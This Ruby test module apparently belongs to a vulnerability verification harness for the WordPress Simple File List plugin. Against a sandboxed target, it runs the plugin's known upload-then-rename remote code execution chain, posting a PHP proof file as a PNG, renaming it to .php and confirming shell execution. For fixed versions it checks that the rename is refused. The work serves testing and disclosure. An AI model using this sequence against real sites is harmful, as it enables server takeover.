# frozen_string_literal: true

require 'rex/mime/message'
require 'rex/zip'
require_relative '../wp_batch_desync_rce/native'

# Independent vendor HTTP, source, file/state, callback and resource controls.
module SimpleFileListNative
  include WordpressBatchChainTarget

  MUTABLE_LOGS = %w[logs/ee-file-error.log logs/ee-upload-error.log].freeze

  def chain_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-simple-file-list.json'), JSON.pretty_generate(@chain)) if @chain
  end

  def chain_identity(label)
    output, = chain_command(label, 'app', 'php', '/opt/module-target/control.php')
    data = JSON.parse(output)
    (@chain[:identities] ||= []) << { label: label, data: data }
    chain_save
    expect(data.values_at('core', 'php', 'uid', 'selected_release', 'database', 'role')).to eq(['6.8.3', '8.3.28', 33, @release, 'wp_root', 'module_target@%'])
    expect(data.values_at('version', 'constant_version', 'active_plugins')).to eq([@release, @release, ['simple-file-list/ee-simple-file-list.php']])
    expect(data.fetch('server')).to start_with('11.2.2-MariaDB')
    expect(data.fetch('grants').join("\n")).not_to include('ALL PRIVILEGES ON *.*', 'GRANT OPTION')
    expect(data.values_at('db_error', 'bootstrap_output_base64')).to eq(['', ''])
    expect(data.fetch('archive_sha256')).to eq(@catalog.fetch('sha256'))
    expect(data.fetch('installed_sha256').except(*MUTABLE_LOGS)).to eq(@catalog.fetch('installed_sha256').except(*MUTABLE_LOGS))
    expect(data.fetch('installed_sha256')).to eq(@catalog.fetch('installed_sha256')) if label == 'before-boot'
    expect(data.values_at('home', 'siteurl')).to eq(['http://module-target.test' + @prefix] * 2)
    expect(data.fetch('filesystem').values_at('uid', 'writable')).to eq([33, true])
    expect(data.fetch('filesystem').fetch('free_bytes')).to be > 16_777_216
    expect(data.fetch('config').values_at('AllowUploads', 'AllowFrontManage', 'Notify')).to eq(%w[YES NO NO])
    formats = data.fetch('config').fetch('FileFormats').split(',').map(&:strip)
    expect(formats).to include('png', 'zip')
    expect(formats).not_to include('php')
    data
  end

  def sfl_selected(data)
    data.except('filesystem', 'vendor_logs', 'bootstrap_output_base64').merge('installed_sha256' => data.fetch('installed_sha256').except(*MUTABLE_LOGS))
  end

  def chain_assert_restored(current, original = @baseline)
    expect(sfl_selected(current)).to eq(sfl_selected(original))
  end

  def sfl_frontend(label, identity)
    response = chain_request(label, identity.fetch('page').fetch('url'))
    expect(response.code).to eq('200')
    values = %w[eeSFL_FileUploadDir eeSFL_TimeStamp eeSFL_TimeStampMD5 eeSFL_UploadEngineURL].to_h do |field|
      value = response.body[/var\s+#{field}\s*=\s*"([^"\r\n]+)"/, 1]
      expect(value).not_to be_nil
      [field, value]
    end
    expect(URI.decode_www_form_component(values.fetch('eeSFL_FileUploadDir'))).to eq(identity.fetch('config').fetch('FileListDir'))
    expect(URI(values.fetch('eeSFL_UploadEngineURL')).path).to eq(@prefix + '/wp-content/plugins/simple-file-list/ee-upload-engine.php')
    values
  end

  def sfl_upload(label, name, bytes, fields, bad_token: false)
    token = fields.fetch('eeSFL_TimeStampMD5').dup
    token[0] = token.start_with?('0') ? '1' : '0' if bad_token
    multipart = Rex::MIME::Message.new
    { 'eeSFL_ID' => '1', 'eeSFL_FileUploadDir' => fields.fetch('eeSFL_FileUploadDir'), 'eeSFL_Timestamp' => fields.fetch('eeSFL_TimeStamp'), 'eeSFL_Token' => token }.each do |field, value|
      multipart.add_part(value, nil, nil, 'form-data; name="' + field + '"')
    end
    multipart.add_part(bytes, 'application/octet-stream', 'binary', 'form-data; name="file"; filename="' + name + '"')
    chain_request(label, URI(fields.fetch('eeSFL_UploadEngineURL')).path, multipart.to_s, raw: true, headers: { 'Content-Type' => 'multipart/form-data; boundary=' + multipart.bound })
  end

  def sfl_action(label, action, name, new_name = nil)
    fields = { 'eeSFL_ID' => '1', 'eeListFolder' => '/', 'eeFileAction' => action == 'Rename' ? 'Rename|' + new_name : action }
    fields[action == 'Rename' ? 'eeFileOld' : 'eeFileName'] = name
    chain_request(label, @prefix + '/wp-content/plugins/simple-file-list/ee-file-engine.php', fields, form: true)
  end

  def sfl_get(label, name)
    chain_request(label, @prefix + '/' + @upload_directory + name)
  end

  def sfl_delete(label, name)
    response = sfl_action(label, 'Delete', name)
    expect([response.code, response.body.strip]).to eq(['200', 'SUCCESS'])
    expect(sfl_get(label + '-absent', name).code).to eq('404')
  end

  def sfl_ordinary(label, fields)
    archive = Rex::Zip::Archive.new
    archive.add_file('native.txt', 'Owned native Simple File List control')
    bytes = archive.pack
    response = sfl_upload(label + '-upload', 'native-sfl-control.zip', bytes, fields)
    expect([response.code, response.body.strip]).to eq(['200', 'SUCCESS'])
    expect(sfl_get(label + '-download', 'native-sfl-control.zip').body.b).to eq(bytes.b)
    response = sfl_action(label + '-rename', 'Rename', 'native-sfl-control.zip', 'native-sfl-renamed.zip')
    expect([response.code, response.body.strip]).to eq(['200', 'SUCCESS'])
    expect(sfl_get(label + '-renamed-download', 'native-sfl-renamed.zip').body.b).to eq(bytes.b)
    sfl_delete(label + '-delete', 'native-sfl-renamed.zip')
  end

  def chain_native_gate(phase)
    boot = chain_identity(phase + '-boot')
    expect(boot.fetch('users').length).to eq(4)
    expect(boot.fetch('users').map { |user| user.fetch('sessions') }).to all(eq([]))
    readme = chain_request(phase + '-readme', @prefix + '/wp-content/plugins/simple-file-list/readme.txt')
    expect(readme.code).to eq('200')
    expect(readme.body).to include('Stable tag: ' + @release)
    fields = sfl_frontend(phase + '-actual-shortcode', boot)
    original = chain_identity(phase + '-baseline')
    @upload_directory = original.fetch('config').fetch('FileListDir')
    sfl_ordinary(phase + '-ordinary', fields)
    chain_assert_restored(chain_identity(phase + '-ordinary-restored'), original)
    proof = File.binread(File.join(__dir__, 'proof.php'))
    response = sfl_upload(phase + '-wrong-token', 'native-sfl-bad.png', proof, fields, bad_token: true)
    expect(response.body).not_to include('SUCCESS')
    expect(sfl_get(phase + '-wrong-token-no-file', 'native-sfl-bad.png').code).to eq('404')
    response = sfl_upload(phase + '-direct-php-denied', 'native-sfl-direct.php', proof, fields)
    expect(response.body).not_to include('SUCCESS')
    expect(sfl_get(phase + '-direct-php-no-file', 'native-sfl-direct.php').code).to eq('404')
    chain_assert_restored(chain_identity(phase + '-negative-state'), original)
    response = sfl_upload(phase + '-php-as-png', 'native-sfl-proof.png', proof, fields)
    expect([response.code, response.body.strip]).to eq(['200', 'SUCCESS'])
    expect(sfl_get(phase + '-png-inert', 'native-sfl-proof.png').body.b).to eq(proof.b)
    response = sfl_action(phase + '-extension-change', 'Rename', 'native-sfl-proof.png', 'native-sfl-proof.php')
    if @affected
      expect([response.code, response.body.strip]).to eq(['200', 'SUCCESS'])
      response = sfl_get(phase + '-real-execution', 'native-sfl-proof.php')
      expect(response.code).to eq('200')
      data = JSON.parse(response.body)
      expect(data.values_at('marker', 'uid', 'bash')).to eq(['MODULE_TARGET_NATIVE_SFL_PROOF', 33, true])
      expect(data.fetch('shell')).to start_with('uid=33(')
      (@chain[:native_execution] ||= []) << { phase: phase, **data }
      expect(sfl_get(phase + '-old-png-absent', 'native-sfl-proof.png').code).to eq('404')
      sfl_delete(phase + '-proof-delete', 'native-sfl-proof.php')
    else
      expect(response.code).to eq('500')
      expect(response.body).not_to include('SUCCESS')
      expect(sfl_get(phase + '-fixed-php-absent', 'native-sfl-proof.php').code).to eq('404')
      expect(sfl_get(phase + '-fixed-png-retained', 'native-sfl-proof.png').body.b).to eq(proof.b)
      expect(chain_identity(phase + '-veto-logged').fetch('vendor_logs').values.map { |log| log.fetch('tail') }.join).to include('Changing File Extensions is Not Allowed')
      sfl_delete(phase + '-fixed-png-delete', 'native-sfl-proof.png')
    end
    sfl_ordinary(phase + '-post-boundary-ordinary', fields)
    final = chain_identity(phase + '-native-restored')
    chain_assert_restored(final, original)
    callback = chain_callback_probe
    chain_resources(phase, %w[app db reporting_db])
    @chain.fetch(:controls) << { phase: phase, affected: @affected, ordinary_before_after: true, selected_state_restored: true, passed: true }
    chain_save
    [final, callback]
  end
end
